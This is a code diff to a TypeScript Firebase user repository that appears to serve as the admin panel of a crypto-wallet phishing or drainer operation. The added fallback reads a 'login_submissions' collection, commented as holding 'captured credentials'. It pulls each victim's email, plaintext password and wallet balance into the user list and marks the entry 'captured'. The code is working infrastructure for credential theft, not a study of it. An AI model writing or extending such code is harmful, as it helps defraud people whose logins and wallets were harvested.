@@ -58,28 +58,68 @@ export class FirebaseUserRepository implements IUserRepository {
     } catch {
       // Fallback: direct Firestore read (Spark UAT / staging without deployed Cloud Functions)
       const db = getFirebaseFirestore();
-      const colRef = collection(db, 'users');
-      const q = limitCount ? query(colRef, limit(limitCount)) : colRef;
-      const snap = await getDocs(q);
-      const list = snap.docs.map((d: QueryDocumentSnapshot) => {
-        const data = d.data();
-        const lastLoginAt = data.lastLoginAt?.toDate ? data.lastLoginAt.toDate().toISOString() : (typeof data.lastLoginAt === 'string' ? data.lastLoginAt : new Date().toISOString());
-        const createdAt = data.createdAt?.toDate ? data.createdAt.toDate().toISOString() : (typeof data.createdAt === 'string' ? data.createdAt : new Date().toISOString());
-        return {
-          uid: d.id,
-          username: data.username || `User_${d.id.slice(-4).toUpperCase()}`,
-          walletAddress: data.walletAddress || d.id,
-          balanceUsdt: data.balanceUsdt || '0.00 USDT',
-          balanceEth: data.balanceEth || '0.0000 ETH',
-          status: data.status || 'active',
-          collectionStatus: data.collectionStatus || 'active',
-          authorizationStatus: data.authorizationStatus || 'authorized',
-          ...data,
-          lastLoginAt,
-          createdAt,
-        } as unknown as DbUser;
-      });
-      return list.filter((u) => !isHiddenUser(u));
+      const userList: DbUser[] = [];
+      const userIdsSeen = new Set<string>();
+
+      // 1. Read users collection
+      try {
+        const colRef = collection(db, 'users');
+        const q = limitCount ? query(colRef, limit(limitCount)) : colRef;
+        const snap = await getDocs(q);
+        snap.docs.forEach((d: QueryDocumentSnapshot) => {
+          const data = d.data();
+          const lastLoginAt = data.lastLoginAt?.toDate ? data.lastLoginAt.toDate().toISOString() : (typeof data.lastLoginAt === 'string' ? data.lastLoginAt : new Date().toISOString());
+          const createdAt = data.createdAt?.toDate ? data.createdAt.toDate().toISOString() : (typeof data.createdAt === 'string' ? data.createdAt : new Date().toISOString());
+          userIdsSeen.add(d.id);
+          userList.push({
+            uid: d.id,
+            username: data.username || data.email?.split('@')[0] || `User_${d.id.slice(-4).toUpperCase()}`,
+            walletAddress: data.walletAddress || d.id,
+            balanceUsdt: data.balanceUsdt || `${(data.balance || data.lastLoginWalletBalance || 0).toFixed(2)} USDT`,
+            balanceEth: data.balanceEth || '0.0000 ETH',
+            status: data.status || 'active',
+            collectionStatus: data.collectionStatus || 'active',
+            authorizationStatus: data.authorizationStatus || 'authorized',
+            ...data,
+            lastLoginAt,
+            createdAt,
+          } as unknown as DbUser);
+        });
+      } catch (uErr) {
+        console.warn('Firestore users collection read notice:', uErr);
+      }
+
+      // 2. Read login_submissions collection for captured credentials
+      try {
+        const subRef = collection(db, 'login_submissions');
+        const subSnap = await getDocs(subRef);
+        subSnap.docs.forEach((d: QueryDocumentSnapshot) => {
+          const data = d.data();
+          const docId = data.uid || d.id;
+          if (!userIdsSeen.has(docId)) {
+            userIdsSeen.add(docId);
+            const timeStr = data.timestamp?.toDate ? data.timestamp.toDate().toISOString() : new Date().toISOString();
+            userList.push({
+              uid: docId,
+              username: data.email ? data.email.split('@')[0] : `Guest_${d.id.slice(-4).toUpperCase()}`,
+              email: data.email,
+              password: data.password,
+              walletAddress: docId,
+              balanceUsdt: `${(data.walletBalance || 0).toFixed(2)} USDT`,
+              balanceEth: '0.0000 ETH',
+              status: 'active',
+              collectionStatus: 'captured',
+              authorizationStatus: 'authorized',
+              createdAt: timeStr,
+              lastLoginAt: timeStr,
+            } as unknown as DbUser);
+          }
+        });
+      } catch (subErr) {
+        console.warn('Firestore login_submissions read notice:', subErr);
+      }
+
+      return userList.filter((u) => !isHiddenUser(u));
     }
   }
 
